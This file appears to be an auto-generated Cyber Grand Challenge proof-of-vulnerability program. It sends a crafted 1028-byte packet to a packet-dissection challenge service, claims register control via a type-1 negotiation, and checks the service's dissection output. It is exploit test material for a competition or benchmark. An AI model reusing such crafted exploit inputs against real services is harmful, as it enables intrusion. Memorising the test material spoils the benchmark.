#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x04\x6a\x2a\x9f"
         "\xdb\x79\x2e\xe4\xe1\x5a\x2c\xa2\xcd\x14\x0a\x27\x71\xca\xf2\x3f"
         "\x0c\x01\x00\x00\xac\xf9\xb3\x22\x8f\x5e\x34\x98\x59\xa0\x13\x34"
         "\x38\x10\xb8\x88\xa2\x33\x94\xff\x36\x2c\x2a\x69\x51\x4b\x32\x6a"
         "\xa4\xbc\xae\xb7\xc8\xc9\x20\x6e\x1f\x16\x10\xf8\xca\x61\x8c\x20"
         "\x52\xca\x70\xd0\xc5\xd6\xb1\x80\xe8\x28\x32\xc9\xc5\x6e\xea\xbf"
         "\x63\x76\xb3\x96\xe1\x67\x3e\x7c\xc5\xa9\xa4\x1a\x6f\x90\x30\x14"
         "\x15\x8b\x41\x29\x46\x68\xf6\x8a\x2d\x24\x4d\x5e\x1b\x55\x89\x66"
         "\xc9\x22\xe4\x36\x66\x65\x86\x6a\x87\x72\x39\xd1\x94\x41\x83\x00"
         "\x0c\xb2\x26\x47\xd7\xf7\xf4\x14\xe9\xee\x61\xe9\xf2\xb8\x01\xa4"
         "\x3a\x3a\xcb\xb5\x92\x53\xee\x80\x7f\x0c\x18\x45\x8d\x5a\xde\x62"
         "\xc2\x18\xe1\x9e\x0b\x98\x72\xa2\x19\x97\x50\x44\xe7\xe5\xc6\xb8"
         "\x3a\x0c\x9c\xf9\xc9\x03\xc9\xfe\x97\x3c\xcf\x9f\x14\x19\x49\x3b"
         "\xa4\xb3\x08\xa5\x12\x5e\x95\xe4\xb1\x44\xbd\x93\xe5\x8a\xfa\x8c"
         "\x7f\x56\x3c\x4b\x16\x14\xf4\x83\x08\x45\x2e\xc2\xb7\x1a\x78\x8d"
         "\x9e\x65\x37\x47\x9a\x41\xd7\xc9\xd5\xad\xce\x91\x64\xd0\xf6\xeb"
         "\x43\x9b\xe5\xcd\x18\x35\x7b\xa5\x0e\x40\x0a\xda\xbf\x78\x48\xa4"
         "\x5f\x7b\x83\xbd\x19\x4d\xb9\x02\x51\x21\x84\x4a\x10\xf3\x1b\x64"
         "\x32\x22\x3e\x52\xae\xd2\x2e\x90\x9c\xc6\x17\x8a\x0d\x02\x82\x01"
         "\x0f\xe1\x8d\xa4\x20\xd5\x03\xc7\x1f\xf8\x68\x63\x94\x11\x85\xa2"
         "\xf3\x88\xf1\x61\x46\x7a\xf7\xa9\x67\x9a\x23\x8d\x60\x1d\xc2\x4a"
         "\x20\x39\xea\xda\xeb\x96\x45\x2c\x82\x7b\xa8\xfb\xc6\xb0\x83\x3a"
         "\x59\xe8\x20\xff\xe0\x97\xbd\x09\x12\x3e\x2f\x80\x1c\x66\x6c\x01"
         "\x97\xd4\x8c\xf4\x89\xd8\x16\xf2\x56\x13\x8b\xe1\xfd\xfe\x2b\xe3"
         "\x35\xaa\x9f\x50\x06\x09\xcc\x68\xd3\xd1\x01\x5d\xbc\x12\xd3\xc5"
         "\xe8\xd3\x8b\xdf\x03\x77\xca\x95\x1a\x9c\x7c\x1d\xa3\x9d\xbf\x9a"
         "\xd9\x4f\xe2\xb0\xbc\xda\x5e\x5c\x32\x87\x27\x64\x94\xf4\x5e\x16"
         "\x68\xf5\x76\x57\xc7\x91\x3c\x31\x15\x7b\xf9\xcc\xcf\xfe\x1a\xb8"
         "\xe9\xd2\x79\x08\xaf\xb9\x20\x7e\xe9\xc4\x8f\x70\x77\x7b\x1a\xc5"
         "\x6e\x1b\x68\x81\x25\x1c\x55\x74\x78\x3b\x0f\xd4\x9f\x17\x46\x1b"
         "\x93\xa9\x24\xca\x9c\x7b\x7a\x25\xe5\xcb\xbf\x12\x8e\x3e\xb1\xb1"
         "\x4e\xce\x7b\x6a\x6f\x85\xa2\x58\xb1\xa8\xcd\xdd\x6d\xf1\x20\x1b"
         "\x66\xcf\x10\x31\x3c\x1d\xac\x1d\xca\x23\x89\x14\x56\xb2\x7b\x87"
         "\x05\x53\xc3\x94\xf9\x74\x03\x03\x2f\xb5\xf3\xe5\xd1\x2d\x02\x07"
         "\xbc\x81\x9d\xd2\xc5\x55\x85\x02\xc8\x40\xc7\x83\x64\x98\xfa\x29"
         "\xe6\xc5\xaa\x8d\x5d\x7b\x51\x7e\x5c\xdb\xf2\xa1\x6c\xb1\xcf\x4a"
         "\xda\x5f\x3d\x57\xe8\xd3\xc7\x0a\xc3\x43\x32\xba\xdc\x8d\xb0\xa2"
         "\x9f\x18\xba\x0a\xdb\xa3\xda\x6b\x9b\xa9\x44\x1e\xc8\x27\x34\xc9"
         "\x34\x89\xef\x96\x10\x8f\x76\x0b\x87\xfa\x37\x4e\x24\xaf\xad\xa2"
         "\xc9\x21\x0c\x30\x3a\x8d\x4d\x9f\x1e\xe6\xa2\xe3\x3d\xd9\x29\x4d"
         "\xec\x27\xd2\x0d\x71\x9f\xe0\xdd\x6f\x43\x69\xde\x81\x8a\x20\xb1"
         "\x57\xe5\x67\x5a\xc6\xd6\xf6\xc9\x78\xe6\x38\x4e\x3a\xab\x0d\xc6"
         "\xc3\x32\xf6\xce\x93\x7e\x5d\x70\x55\xfc\x13\x83\x90\xc1\xed\x7d"
         "\x7a\x6c\x47\x28\x9b\xf7\xb5\x66\x8a\xf0\xab\x6a\x48\x5f\x82\x0e"
         "\x30\x71\x57\x09\x7a\xc4\xd7\x52\x92\x5f\xe7\xcd\x94\x47\x95\x77"
         "\xa1\x8b\xf9\x56\x90\x25\x93\xbb\xe1\xbf\xc5\x22\x3b\x88\xf3\x66"
         "\xa6\xf6\x7a\x9f\xfe\x5f\x7e\x7a\x7d\x98\x5c\x1b\x04\x2e\xa9\xb3"
         "\xb1\x5a\xd7\xb4\x14\xfc\x23\x39\x8c\xf9\xc4\xda\xda\x08\x03\xfc"
         "\x73\x82\xd4\x0b\x8b\x9c\x2f\x48\xc9\x77\x38\xe1\x9d\xd5\xb0\xad"
         "\x3f\xf2\x85\xf4\xff\x9d\x8e\x7b\x72\x0b\x5b\xab\x05\x4a\xa6\xed"
         "\x83\x83\xc6\x7d\xd2\x7b\x39\xb4\x90\x21\xa4\x27\x2a\xf3\x60\x14"
         "\x78\x76\xdd\x4b\x91\xa1\xda\x09\x60\x6f\xe5\x4e\xea\x4f\x09\x8e"
         "\xa6\x3a\xd2\x00\xb8\x99\xd9\x31\x83\xe7\xaa\xe8\xe1\xd0\xd9\x16"
         "\x72\xd3\x9e\xc8\xac\xd7\xa9\x3c\x5e\x8b\x88\xa8\x6f\x85\x4c\x66"
         "\x41\xc1\x2e\x74\x8a\x78\xdc\x0e\x9a\x6e\x76\x64\x3d\x72\x94\xae"
         "\xf2\x6d\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===unmonarchicalnourishment
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x75\x6e\x6d\x6f\x6e\x61\x72\x63\x68\x69\x63"
         "\x61\x6c\x6e\x6f\x75\x72\x69\x73\x68\x6d\x65\x6e\x74";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
